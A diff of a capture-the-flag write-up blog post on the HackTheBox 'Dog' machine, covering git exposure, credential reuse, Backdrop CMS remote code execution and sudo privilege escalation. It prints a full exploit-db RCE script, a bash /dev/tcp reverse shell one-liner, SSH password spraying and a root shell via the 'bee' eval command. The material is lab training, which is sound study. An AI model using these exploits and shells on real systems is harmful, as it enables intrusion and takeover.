-<p>This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed <code>.git</code> directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as <code>www-data</code>. For privilege escalation, we discover that a user (<code>johncusack</code>) can execute a PHP utility (<code>bee</code>) as root, which we then abuse to spawn a root shell.</p>
+<img src="/img/dog/Dog.png" alt="" class="img-responsive" loading="lazy" />
+<p><code>Dog</code> is an easy box from <a href="https://app.hackthebox.com/">HackTheBox</a> that focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed <code>.git</code> directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as <code>www-data</code>. For privilege escalation, we discover that a user (<code>johncusack</code>) can execute a PHP utility (<code>bee</code>) as root, which we then abuse to spawn a root shell.</p>
+
+<div class="target-info">
+    <div class="target-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <circle cx="12" cy="12" r="6"/>
+            <circle cx="12" cy="12" r="2"/>
+        </svg>
+    </div>
+    <div class="target-details">
+        <div class="target-item">
+            <span class="target-label">Target IP</span>
+            <code class="ip-address">10.10.11.58</code>
+        </div>
+        
+    </div>
+</div>
+
+<style>
+.target-info {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 16px;
+    margin: 16px 0;
+    background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+    border-left: 4px solid #9fef00;
+    border-radius: 8px;
+    font-family: system-ui, -apple-system, sans-serif;
+}
+
+.target-icon {
+    flex-shrink: 0;
+}
+
+.target-icon svg {
+    width: 20px;
+    height: 20px;
+    color: #9fef00;
+    display: block;
+}
+
+.target-details {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+
+.target-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.creds-separator {
+    flex-shrink: 0;
+    opacity: 1;
+}
+
+.creds-separator svg {
+    width: 18px;
+    height: 18px;
+    color: #9fef00;
+    display: block;
+    stroke-width: 2.5;
+}
+
+.target-label {
+    font-size: 14px;
+    font-weight: 600;
+    color: #c9d1d9;
+    white-space: nowrap;
+}
+
+.ip-address, .credentials {
+    color: #9fef00;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    font-weight: bold;
+    background: none !important;
+    background-color: transparent !important;
+    padding: 0 !important;
+    border: none !important;
+    border-radius: 0 !important;
+}
+</style>
 
 
 
-<div id="flowchart-1752005338730491973" class="attack-path-flowchart">
+
+
+<div id="flowchart-1752344197940519788" class="attack-path-flowchart">
   <div class="flowchart-controls">
     <button class="zoom-btn" data-action="zoom-in" title="Zoom In">+</button>
     <button class="zoom-btn" data-action="zoom-out" title="Zoom Out">−</button>
@@ -612,9 +704,9 @@ This box focuses on web application vulnerabilities, specifically a misconfigure
 })();
 </script>
 
-<h3 id="test-attack-path-lang-to-d"><strong>TEST ATTACK PATH LANG TO :D</strong><a hidden class="anchor" aria-hidden="true" href="#test-attack-path-lang-to-d">#</a></h3>
 <hr>
-<h1 id="1-kicking-off-with-nmap">1. Kicking Off with Nmap<a hidden class="anchor" aria-hidden="true" href="#1-kicking-off-with-nmap">#</a></h1>
+<h1 id="1-reconnaissance-ta0043">1. Reconnaissance (TA0043)<a hidden class="anchor" aria-hidden="true" href="#1-reconnaissance-ta0043">#</a></h1>
+<h3 id="11-network-scanning-t1595">1.1. Network Scanning (T1595)<a hidden class="anchor" aria-hidden="true" href="#11-network-scanning-t1595">#</a></h3>
 <p>As always, we start with an <code>nmap</code> scan to see what services are running on the target.
 <div class="terminal-linux">
   <div class="terminal-header">
@@ -669,9 +761,10 @@ Service detection performed. Please report any incorrect results at https://nmap
   </div>
 </div>
 </p>
-<p>From the Nmap output, we observe an open SSH port (22/tcp) and an HTTP server (80/tcp) running Apache. The HTTP server reveals a <code>.git/</code> directory, indicating a Git repository, and identifies the web application as <code>Backdrop CMS</code>.</p>
+<p>From the Nmap output, we see an open SSH port (<code>22/tcp</code>) and an HTTP server (<code>80/tcp</code>) running Apache. The HTTP server reveals a <code>.git/</code> directory, which is a big deal, and also identifies the web application as <code>Backdrop CMS</code>.</p>
 <hr>
-<h1 id="2-enumeration">2. Enumeration<a hidden class="anchor" aria-hidden="true" href="#2-enumeration">#</a></h1>
+<h1 id="2-initial-access-ta0001">2. Initial Access (TA0001)<a hidden class="anchor" aria-hidden="true" href="#2-initial-access-ta0001">#</a></h1>
+<h3 id="21-web-enumeration-and-git-exposure-t1590">2.1. Web Enumeration and Git Exposure (T1590)<a hidden class="anchor" aria-hidden="true" href="#21-web-enumeration-and-git-exposure-t1590">#</a></h3>
 <p>We&rsquo;ll run <code>gobuster</code> in the background to discover more directories and files on the web server.
 <div class="terminal-linux">
   <div class="terminal-header">
@@ -760,7 +853,6 @@ Finished
 </div>
 </p>
 <p>The <code>gobuster</code> scan confirms the presence of the <code>.git</code> directory, which was also found by Nmap. Since Backdrop CMS is open-source, we&rsquo;ll focus on the <code>.git</code> directory for potential information disclosure.</p>
-<h3 id="dumping-git-using-git-dumper">Dumping .git/ using git-dumper<a hidden class="anchor" aria-hidden="true" href="#dumping-git-using-git-dumper">#</a></h3>
 <p>We&rsquo;ll use <a href="https://github.com/arthaud/git-dumper">git-dumper</a> to extract the contents of the <code>.git</code> repository from the web server.</p>
 <div class="terminal-linux">
   <div class="terminal-header">
@@ -794,8 +886,8 @@ Finished
   </div>
 </div>
 
-<h3 id="db-password">DB Password<a hidden class="anchor" aria-hidden="true" href="#db-password">#</a></h3>
-<p>Within the dumped <code>.git</code> repository, we found a <code>settings.php</code> file in the root directory that contains database credentials.
+<h3 id="22-credential-discovery-from-git-t1555">2.2. Credential Discovery from Git (T1555)<a hidden class="anchor" aria-hidden="true" href="#22-credential-discovery-from-git-t1555">#</a></h3>
+<p>Within the dumped .git repository, I found a settings.php file in the root directory that contains database credentials.
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -830,10 +922,10 @@ $database_prefix = <span class="string">''</span>;
 </div>
 </p>
 <p>The credentials found are <code>root</code>:<code>BackDropJ2024DS2024</code>.</p>
-<p>We attempted to log in to the website&rsquo;s admin panel using these credentials, but <code>root</code> was not a valid username.</p>
-<p><img alt="Invald creds" loading="lazy" src="/img/dog/Invalid_Creds.png"></p>
-<h3 id="finding-a-valid-user">Finding a valid user<a hidden class="anchor" aria-hidden="true" href="#finding-a-valid-user">#</a></h3>
-<p>We used <code>grep</code> to recursively search for strings containing <code>dog.htb</code> within the dumped Git repository, hoping to find valid usernames.</p>
+<p>I tried to log in to the website&rsquo;s admin panel using these credentials, but root was not a valid username.</p>
+<img src="/img/dog/Invalid_Creds.png" alt="" class="img-responsive" loading="lazy" />
+<h3 id="23-finding-a-valid-user">2.3. Finding a Valid User<a hidden class="anchor" aria-hidden="true" href="#23-finding-a-valid-user">#</a></h3>
+<p>I used grep to recursively search for strings containing dog.htb within the dumped Git repository, hoping to find valid usernames.</p>
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -855,7 +947,6 @@ files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:      
 </div>
 
 <p>We found a potential username: <code>tiffany@dog.htb</code>.</p>
-<p>We added the domain to our <code>/etc/hosts</code> file for easier access.
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -871,17 +962,16 @@ files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:      
 </code><button class="copy-code">copy</button></pre>
   </div>
 </div>
-</p>
-<p>Using <code>tiffany</code> as the username and <code>BackDropJ2024DS2024</code> as the password, we were able to log into the Backdrop CMS admin panel.</p>
-<p><img alt="Admin Panel" loading="lazy" src="/img/dog/admin_panel.png"></p>
-<hr>
-<h1 id="3-foothold-and-user-flag">3. Foothold and User flag<a hidden class="anchor" aria-hidden="true" href="#3-foothold-and-user-flag">#</a></h1>
-<p>Now that we have authenticated access to the Backdrop CMS admin panel, we&rsquo;ll look for a way to gain a shell. We searched for exploits related to <strong>&ldquo;Backdrop CMS&rdquo;</strong> and found an authenticated RCE exploit on <code>exploit-db</code>.</p>
+
+<p>Using <code>tiffany</code> as the username and <code>BackDropJ2024DS2024</code> as the password, I was able to log into the Backdrop CMS admin panel.</p>
+<img src="/img/dog/admin_panel.png" alt="" class="img-responsive" loading="lazy" />
+<h3 id="24-authenticated-rce-in-backdrop-cms-t1190">2.4. Authenticated RCE in Backdrop CMS (T1190)<a hidden class="anchor" aria-hidden="true" href="#24-authenticated-rce-in-backdrop-cms-t1190">#</a></h3>
+<p>Now that we have authenticated access to the Backdrop CMS admin panel, we&rsquo;ll look for a way to gain a shell. I searched for exploits related to &ldquo;Backdrop CMS&rdquo; and found an authenticated RCE exploit on <code>exploit-db</code>.</p>
 <ul>
 <li><a href="https://www.exploit-db.com/exploits/52021">https://www.exploit-db.com/exploits/52021</a></li>
 </ul>
-<p><img alt="Exploit-db" loading="lazy" src="/img/dog/exploit-db.png"></p>
-<p>The exploit script generates a malicious module (<code>shell.zip</code>) that can be uploaded to the CMS.</p>
+<img src="/img/dog/exploit-db.png" alt="" class="img-responsive" loading="lazy" />
+<p>The exploit script generates a malicious module (shell.zip) that can be uploaded to the CMS.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># Exploit Title: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># Date: 04/27/2024</span>
@@ -976,8 +1066,7 @@ files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:      
 </span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
 </span></span><span class="line"><span class="cl">            
-</span></span></code></pre></div><h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
-<p>Running the Python script:
+</span></span></code></pre></div><p>Running the Python script:
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -1002,9 +1091,114 @@ Your shell address: http://10.10.11.58//modules/shell/shell.php
 </p>
 <p>The script instructs us to upload <code>shell.zip</code> via the <strong>&ldquo;Manual Installation&rdquo;</strong> option in the CMS admin panel (<code>http://dog.htb/admin/modules/install</code>).</p>
 <p><code>Functionality &gt; Install new modules &gt; Manual Installation</code></p>
-<p><img alt="Step 1" loading="lazy" src="/img/dog/step1.png">
-<img alt="Step 2" loading="lazy" src="/img/dog/step2.png"></p>
-<p><img alt="Step 3" loading="lazy" src="/img/dog/step3.png"></p>
+
+<div class="ctf-bullet-list">
+    <ul>
+<li>
+<img src="/img/dog/step1.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<img src="/img/dog/step2.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<img src="/img/dog/step3.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+</ul>
+
+</div>
+
+<style>
+.ctf-bullet-list ul {
+    list-style: none;
+    padding-left: 0;
+    margin: 16px 0;
+}
+
+.ctf-bullet-list li {
+    position: relative;
+    padding-left: 32px;
+    margin-bottom: 20px;
+}
+
+.ctf-bullet-list li::before {
+    content: '';
+    position: absolute;
+    left: 4px;
+    top: 6px;
+    width: 12px;
+    height: 12px;
+    background-color: #9fef00;
+    border-radius: 50%;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+    z-index: 2;
+}
+
+.ctf-bullet-list li::after {
+    content: '';
+    position: absolute;
+    left: 9px;
+    top: 18px;
+    width: 2px;
+    height: calc(100% + 20px);
+    background-color: #6ba600;
+    z-index: 1;
+}
+
+.ctf-bullet-list li:last-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li:only-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li > p {
+    margin: 0 0 8px 0;
+}
+
+.ctf-bullet-list li > p:last-child {
+    margin-bottom: 0;
+}
+
+.ctf-bullet-list li img {
+    margin: 8px 0;
+    max-width: 100%;
+    height: auto;
+}
+
+.ctf-bullet-list li > ul {
+    margin-top: 8px;
+    padding-left: 20px;
+}
+
+.ctf-bullet-list li > ul li::before {
+    background-color: #9fef00;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+}
+
+.ctf-bullet-list li > ul li::after {
+    background-color: #6ba600;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    }
+    
+    70% {
+        transform: scale(1);
+        box-shadow: 0 0 0 10px rgba(159, 239, 0, 0);
+    }
+    
+    100% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0);
+    }
+}
+</style>
 <p>However, the CMS only accepts <code>.tar.gz</code> files for manual installation. We need to compress the <code>shell/</code> directory generated by the script into a <code>.tar.gz</code> archive.</p>
 <div class="terminal-linux">
   <div class="terminal-header">
@@ -1025,9 +1219,9 @@ Your shell address: http://10.10.11.58//modules/shell/shell.php
 </div>
 
 <p>Now, we can upload <code>shell.tar.gz</code> through the <strong>&ldquo;Manual installation&rdquo;</strong> page.</p>
-<p><img alt="Installed" loading="lazy" src="/img/dog/installed.png"></p>
-<p>After successful installation, we can access our web shell at <code>http://dog.htb/modules/shell/shell.php</code></p>
-<p><img alt="Shell" loading="lazy" src="/img/dog/shell.png"></p>
+<img src="/img/dog/installed.png" alt="" class="img-responsive" loading="lazy" />
+<p>After successful installation, I can access my web shell at <code>http://dog.htb/modules/shell/shell.php</code>.</p>
+<img src="/img/dog/shell.png" alt="" class="img-responsive" loading="lazy" />
 <p>The web shell confirms we are running as the <code>www-data</code> user. We&rsquo;ll use a reverse shell to get a more stable connection.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/&lt;YOUR IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#39;</span>
 </span></span></code></pre></div><p>On our attacking machine, we set up a <code>netcat</code> listener:
@@ -1203,6 +1397,9 @@ www-data@dog:/var/www/html/modules/shell$ stty rows 45 cols 238
   </div>
 </div>
 
+<hr>
+<h1 id="3-privilege-escalation-ta0004">3. Privilege Escalation (TA0004)<a hidden class="anchor" aria-hidden="true" href="#3-privilege-escalation-ta0004">#</a></h1>
+<h3 id="31-user-enumeration-and-lateral-movement-via-ssh-t1021004">3.1. User Enumeration and Lateral Movement via SSH (T1021.004)<a hidden class="anchor" aria-hidden="true" href="#31-user-enumeration-and-lateral-movement-via-ssh-t1021004">#</a></h3>
 <p>Now that we have a stable shell, we enumerate local users on the system.
 <div class="terminal-linux">
   <div class="terminal-header">
@@ -1216,16 +1413,16 @@ www-data@dog:/var/www/html/modules/shell$ stty rows 45 cols 238
   <div class="terminal-content">
     <pre><code>
 www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd | grep sh$
-root:x:0:0:root:/root:/bin/bash
-jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
-johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
+root:x:0:0:root:/root:/bin/ba<span style="color:red">sh</span>
+jobert:x:1000:1000:jobert:/home/jobert:/bin/ba<span style="color:red">sh</span>
+johncusack:x:1001:1001:,,,:/home/johncusack:/bin/ba<span style="color:red">sh</span>
 
 </code><button class="copy-code">copy</button></pre>
   </div>
 </div>
 </p>
 <p>We found three users with shell access: <code>root</code>, <code>jobert</code>, and <code>johncusack</code>. We&rsquo;ll save these usernames to <code>users.txt</code>.</p>
-<p>We use <code>netexec</code> to spray the database password (<code>BackDropJ2024DS2024</code>) against these users for SSH.
+<p>I used netexec to spray the database password (<code>BackDropJ2024DS2024</code>) against these users for SSH:
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -1240,12 +1437,12 @@ johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
 <span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> ssh 10.10.11.58 <span class="flag">-u</span> <span style="font-weight: bold;">users.txt</span> <span class="flag">-p</span> <span class="string">'BackDropJ2024DS2024'</span> <span class="flag">--continue-on-success</span>
 <span class="ssh">SSH</span>         10.10.11.58     22     10.10.11.58      <span class="indicator-info">[*]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12
 <span class="ssh">SSH</span>         10.10.11.58     22     10.10.11.58      <span class="indicator-error">[-]</span> jobert:BackDropJ2024DS2024
-<span class="ssh">SSH</span>         10.10.11.58     22     10.10.11.58      <span class="indicator-success">[+]</span> johncusack:BackDropJ2024DS2024  Linux - Shell access!
+<span class="ssh">SSH</span>         10.10.11.58     22     10.10.11.58      <span class="indicator-success">[+]</span> johncusack:BackDropJ2024DS2024  <span style="color:orange;font-weight:bold">Linux - Shell access!</span>
 </code><button class="copy-code">copy</button></pre>
   </div>
 </div>
 </p>
-<p>The <code>johncusack</code> user&rsquo;s password is <code>BackDropJ2024DS2024</code>. We can now SSH into the box as <code>johncusack</code>.</p>
+<p>The <code>johncusack</code> user&rsquo;s password is <code>BackDropJ2024DS2024</code>. I can now SSH into the box as <code>johncusack</code>.</p>
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -1330,11 +1527,54 @@ d305454bc5a53fb01aec080ec3a2ee33
   </div>
 </div>
 </p>
-<blockquote>
-<p>User flag: d305454bc5a53fb01aec080ec3a2ee33</p></blockquote>
-<hr>
-<h1 id="4-privilege-escalation-to-root">4. Privilege Escalation to Root<a hidden class="anchor" aria-hidden="true" href="#4-privilege-escalation-to-root">#</a></h1>
-<p>We check <code>sudo -l</code> to see what commands <code>johncusack</code> can run with <code>sudo</code> privileges.</p>
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+User flag: d305454bc5a53fb01aec080ec3a2ee33
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+<h3 id="32-sudo-abuse-for-root-t1548003">3.2. Sudo Abuse for Root (T1548.003)<a hidden class="anchor" aria-hidden="true" href="#32-sudo-abuse-for-root-t1548003">#</a></h3>
+<p>I check sudo -l to see what commands johncusack can run with sudo privileges.</p>
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -1357,7 +1597,7 @@ User johncusack may run the following commands on dog:
   </div>
 </div>
 
-<p>The user <code>johncusack</code> can execute <code>/usr/local/bin/bee</code> as root. We inspect the <code>bee</code> file.</p>
+<p>The user <code>johncusack</code> can execute <code>/usr/local/bin/bee</code> as root. I inspect the <code>bee</code> file.</p>
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -1461,7 +1701,7 @@ User johncusack may run the following commands on dog:
 </span></span><span class="line"><span class="cl">  <span class="c1">// Output the combined string.
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="nv">$browser_output</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>We check the <code>bee</code> command&rsquo;s <code>eval</code> functionality.</p>
+</span></span></code></pre></div><p>I check the bee command&rsquo;s eval functionality:</p>
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -1495,7 +1735,7 @@ Examples:
   </div>
 </div>
 
-<p>The <code>bee</code> command has an <code>eval</code> subcommand that allows us to execute arbitrary PHP code. To use it correctly, we need to specify the <code>--root</code> parameter pointing to the web root (<code>/var/www/html</code>). We can use this to spawn a root shell.</p>
+<p>The <code>bee</code> command has an <code>eval</code> subcommand that allows us to execute arbitrary PHP code. To use it correctly, I need to specify the <code>--root</code> parameter pointing to the web root (<code>/var/www/html</code>). I can use this to spawn a root shell.</p>
 <div class="terminal-linux">
   <div class="terminal-header">
     <div class="window-controls">
@@ -1553,30 +1793,76 @@ root@dog:/var/www/html# cat /root/root.txt
   </div>
 </div>
 </p>
-<blockquote>
-<p>Root flag: 83970a2d7e6797bf5f32b7a915dad3f7</p></blockquote>
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+Root flag: 83970a2d7e6797bf5f32b7a915dad3f7
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
 
 
   </div>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
-      <li><a href="http://localhost:1313/tags/backdrop-cms/">Backdrop CMS</a></li>
-      <li><a href="http://localhost:1313/tags/web-exploitation/">Web Exploitation</a></li>
-      <li><a href="http://localhost:1313/tags/git-exposure/">Git Exposure</a></li>
-      <li><a href="http://localhost:1313/tags/remote-code-execution/">Remote Code Execution</a></li>
-      <li><a href="http://localhost:1313/tags/privilege-escalation/">Privilege-Escalation</a></li>
-      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
-      <li><a href="http://localhost:1313/tags/ctf/">CTF</a></li>
-      <li><a href="http://localhost:1313/tags/php-exploitation/">PHP Exploitation</a></li>
-      <li><a href="http://localhost:1313/tags/information-disclosure/">Information Disclosure</a></li>
+      <li><a href="https://0xblivion.dev/tags/hackthebox/">HackTheBox</a></li>
+      <li><a href="https://0xblivion.dev/tags/hack-the-box/">Hack the Box</a></li>
+      <li><a href="https://0xblivion.dev/tags/hackthebox-dog-writeup/">HackTheBox Dog Writeup</a></li>
+      <li><a href="https://0xblivion.dev/tags/backdrop-cms/">Backdrop CMS</a></li>
+      <li><a href="https://0xblivion.dev/tags/web-exploitation/">Web Exploitation</a></li>
+      <li><a href="https://0xblivion.dev/tags/git-exposure/">Git Exposure</a></li>
+      <li><a href="https://0xblivion.dev/tags/remote-code-execution/">Remote Code Execution</a></li>
+      <li><a href="https://0xblivion.dev/tags/privilege-escalation/">Privilege Escalation</a></li>
+      <li><a href="https://0xblivion.dev/tags/linux/">Linux</a></li>
+      <li><a href="https://0xblivion.dev/tags/ctf/">CTF</a></li>
+      <li><a href="https://0xblivion.dev/tags/php-exploitation/">PHP Exploitation</a></li>
+      <li><a href="https://0xblivion.dev/tags/information-disclosure/">Information Disclosure</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/posts/htb/linux/medium/hackthebox-cat-writeup/">
-    <span class="title">« Prev</span>
+  <a class="next" href="https://0xblivion.dev/posts/thm/windows/hard/tryhackme-fusion-corp-writeup/">
+    <span class="title">Next »</span>
     <br>
-    <span>HackTheBox - Cat Writeup</span>
+    <span>TryHackMe - Fusion Corp WriteUp</span>
   </a>
 </nav>
 
@@ -1585,7 +1871,7 @@ root@dog:/var/www/html# cat /root/root.txt
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">0xblivion.dev</a></span>
+        <span>&copy; 2025 <a href="https://0xblivion.dev/">0xblivion.dev</a></span>
 
 </footer>
 <a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
